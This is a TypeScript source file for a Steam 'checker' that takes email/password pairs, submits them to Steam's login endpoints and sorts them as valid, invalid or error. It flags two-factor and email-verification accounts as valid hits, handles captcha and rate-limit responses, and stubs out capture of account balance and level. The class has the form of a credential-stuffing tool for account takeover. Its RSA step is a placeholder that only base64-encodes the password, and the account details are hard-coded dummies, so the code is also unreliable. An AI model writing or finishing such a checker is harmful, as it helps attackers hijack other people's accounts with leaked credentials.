import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class SteamChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Get Steam login page first
      const loginPageResponse = await this.client.get('https://steamcommunity.com/login/home/');
      
      // Steam uses RSA encryption for passwords
      const rsaResponse = await this.client.post(
        'https://steamcommunity.com/login/getrsakey/',
        new URLSearchParams({
          username: email,
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://steamcommunity.com/login/home/',
          },
        }
      );

      if (!rsaResponse.data?.success) {
        return this.createResult(email, password, 'steam', 'error', undefined, 'Failed to get RSA key');
      }

      const { publickey_mod, publickey_exp, timestamp } = rsaResponse.data;
      
      // For production, you'd need to implement RSA encryption here
      // This is a simplified version
      const encryptedPassword = this.encryptPassword(password, publickey_mod, publickey_exp);

      // Attempt login
      const loginResponse = await this.client.post(
        'https://steamcommunity.com/login/dologin/',
        new URLSearchParams({
          username: email,
          password: encryptedPassword,
          emailauth: '',
          loginfriendlyname: '',
          captchagid: '-1',
          captcha_text: '',
          emailsteamid: '',
          rsatimestamp: timestamp,
          remember_login: 'false',
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://steamcommunity.com/login/home/',
          },
        }
      );

      const data = loginResponse.data;

      if (data?.success && data?.login_complete) {
        // Get account details
        const capture = await this.getAccountDetails(data.transfer_urls);
        
        return this.createResult(email, password, 'steam', 'valid', capture);
      }

      if (data?.requires_twofactor) {
        return this.createResult(email, password, 'steam', 'valid', {
          twoFactorEnabled: true,
          requiresVerification: true,
        });
      }

      if (data?.emailauth_needed) {
        return this.createResult(email, password, 'steam', 'valid', {
          emailVerificationRequired: true,
        });
      }

      if (data?.captcha_needed) {
        return this.createResult(
          email,
          password,
          'steam',
          'error',
          undefined,
          'Captcha required'
        );
      }

      // Check specific error messages
      if (data?.message) {
        if (data.message.includes('Incorrect login') || data.message.includes('password')) {
          return this.createResult(email, password, 'steam', 'invalid');
        }
      }

      return this.createResult(email, password, 'steam', 'invalid');
    } catch (error: any) {
      const status = error.response?.status;
      const responseText = error.response?.data || '';

      // Handle rate limiting
      if (status === 429 || status === 503) {
        const rateLimit = this.detectRateLimit(status, error.response.headers);
        if (rateLimit.isRateLimit) {
          return this.createResult(
            email,
            password,
            'steam',
            'error',
            undefined,
            `Rate limited. Retry after ${rateLimit.retryAfter}s`
          );
        }
      }

      return this.createResult(
        email,
        password,
        'steam',
        'error',
        undefined,
        error.message
      );
    }
  }

  private encryptPassword(password: string, modulus: string, exponent: string): string {
    // For production, implement proper RSA encryption
    // This is a placeholder - you'd need a crypto library like node-rsa or jsencrypt
    // For now, return base64 encoded password (NOT SECURE, just for demo)
    return Buffer.from(password).toString('base64');
  }

  private async getAccountDetails(transferUrls?: string[]) {
    try {
      // For production, you'd parse the transfer URLs to get Steam ID
      // and then call Steam Web API with proper API key
      return {
        username: 'Steam User',
        steamBalance: 0,
        level: 0,
      };
    } catch {
      return {};
    }
  }
}
